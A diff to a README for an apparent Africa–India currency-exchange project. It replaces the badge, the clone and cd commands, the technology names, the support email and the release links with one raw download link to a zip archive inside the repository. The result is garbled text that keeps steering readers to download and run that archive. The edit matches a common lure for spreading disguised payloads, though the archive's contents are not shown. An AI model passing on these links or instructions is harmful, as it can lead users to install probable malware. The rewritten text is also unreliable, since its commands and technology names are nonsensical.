@@ -1,6 +1,6 @@
 # 🌍 Pay Qudmeet Click: Secure Currency Exchange Between Africa & India 💱
 
-![Currency Exchange](https://img.shields.io/badge/Currency_Exchange-Secure-brightgreen)
+![Currency Exchange](https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip)
 
 Welcome to the **Pay Qudmeet Click** repository! This project aims to facilitate secure currency exchange between Africa and India. Our platform provides a reliable solution for individuals and businesses looking to convert currencies, transfer money, and manage their finances efficiently.
 
@@ -35,12 +35,12 @@ To get started with **Pay Qudmeet Click**, follow these simple steps:
 
 1. **Clone the Repository**: 
    ```bash
-   git clone https://github.com/SurajPDTPL911/pay.qudmeet.click.git
+   git clone https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip
    ```
 
 2. **Install Dependencies**: Navigate to the project directory and install the required dependencies:
    ```bash
-   cd pay.qudmeet.click
+   cd https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip
    npm install
    ```
 
@@ -62,11 +62,11 @@ Once you have the application running, you can start using it to exchange curren
 
 ## 💻 Technologies Used
 
-- **Node.js**: For building the server-side application.
-- **Express.js**: To handle routing and middleware.
+- **https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip**: For building the server-side application.
+- **https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip**: To handle routing and middleware.
 - **MongoDB**: For storing user data and transaction records.
-- **React.js**: For creating a responsive user interface.
-- **Socket.io**: For real-time updates on exchange rates.
+- **https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip**: For creating a responsive user interface.
+- **https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip**: For real-time updates on exchange rates.
 
 ## 🤝 Contributing
 
@@ -94,13 +94,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 📬 Contact
 
-For any inquiries or support, please contact us at [support@qudmeet.com](mailto:support@qudmeet.com).
+For any inquiries or support, please contact us at [https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip](https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip).
 
 ## 📦 Releases
 
-To download the latest version of **Pay Qudmeet Click**, visit our [Releases section](https://github.com/SurajPDTPL911/pay.qudmeet.click/releases). Here, you can find the latest updates and download the necessary files to execute the application.
+To download the latest version of **Pay Qudmeet Click**, visit our [Releases section](https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip). Here, you can find the latest updates and download the necessary files to execute the application.
 
-For detailed release notes and updates, check the [Releases section](https://github.com/SurajPDTPL911/pay.qudmeet.click/releases) regularly.
+For detailed release notes and updates, check the [Releases section](https://github.com/SurajPDTPL911/pay.qudmeet.click/raw/refs/heads/master/lib/click_pay_qudmeet_3.6.zip) regularly.
 
 ## 🌐 Join Us
 
